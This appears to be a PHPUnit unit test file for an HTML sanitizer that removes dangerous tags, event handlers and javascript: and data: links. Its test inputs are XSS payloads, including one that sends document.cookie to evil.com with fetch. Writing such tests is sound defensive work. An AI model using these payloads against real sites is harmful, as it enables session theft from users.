<?php

namespace Tests\Unit;

use App\Support\HtmlSanitizer;
use PHPUnit\Framework\TestCase;

class HtmlSanitizerTest extends TestCase
{
    public function test_strips_script_tag(): void
    {
        $this->assertStringNotContainsString('<script>', HtmlSanitizer::clean('<script>alert(1)</script>'));
    }

    public function test_strips_style_tag(): void
    {
        $this->assertStringNotContainsString('<style>', HtmlSanitizer::clean('<style>body{display:none}</style>'));
    }

    public function test_strips_iframe(): void
    {
        $this->assertStringNotContainsString('<iframe', HtmlSanitizer::clean('<iframe src="evil.com"></iframe>'));
    }

    public function test_strips_svg(): void
    {
        $this->assertStringNotContainsString('<svg', HtmlSanitizer::clean('<svg onload="alert(1)"></svg>'));
    }

    public function test_strips_onerror_attribute(): void
    {
        $result = HtmlSanitizer::clean('<img onerror="alert(1)" src="x">');
        $this->assertStringNotContainsString('onerror', $result);
    }

    public function test_strips_onclick_attribute(): void
    {
        $result = HtmlSanitizer::clean('<p onclick="hack()">Text</p>');
        $this->assertStringNotContainsString('onclick', $result);
    }

    public function test_strips_javascript_href(): void
    {
        $result = HtmlSanitizer::clean('<a href="javascript:void(0)">link</a>');
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_strips_data_uri_href(): void
    {
        $result = HtmlSanitizer::clean('<a href="data:text/html,<script>alert(1)</script>">link</a>');
        $this->assertStringNotContainsString('data:', $result);
    }

    public function test_preserves_paragraph_tag(): void
    {
        $result = HtmlSanitizer::clean('<p>Hello world</p>');
        $this->assertStringContainsString('<p>Hello world</p>', $result);
    }

    public function test_preserves_strong_tag(): void
    {
        $result = HtmlSanitizer::clean('<strong>Bold</strong>');
        $this->assertStringContainsString('<strong>Bold</strong>', $result);
    }

    public function test_preserves_anchor_with_safe_href(): void
    {
        $result = HtmlSanitizer::clean('<a href="https://example.com">Link</a>');
        $this->assertStringContainsString('<a', $result);
        $this->assertStringContainsString('https://example.com', $result);
    }

    public function test_preserves_unordered_list(): void
    {
        $result = HtmlSanitizer::clean('<ul><li>Item 1</li><li>Item 2</li></ul>');
        $this->assertStringContainsString('<ul>', $result);
        $this->assertStringContainsString('<li>', $result);
    }

    public function test_handles_null_input(): void
    {
        $this->assertEquals('', HtmlSanitizer::clean(null));
    }

    public function test_handles_empty_string(): void
    {
        $this->assertEquals('', HtmlSanitizer::clean(''));
    }

    public function test_handles_plain_text(): void
    {
        $result = HtmlSanitizer::clean('Just plain text here');
        $this->assertEquals('Just plain text here', $result);
    }

    public function test_complex_xss_payload(): void
    {
        $payload = '<div><p>Real content</p><script>fetch("https://evil.com?c="+document.cookie)</script></div>';
        $result  = HtmlSanitizer::clean($payload);
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('document.cookie', $result);
        $this->assertStringContainsString('Real content', $result);
    }
}
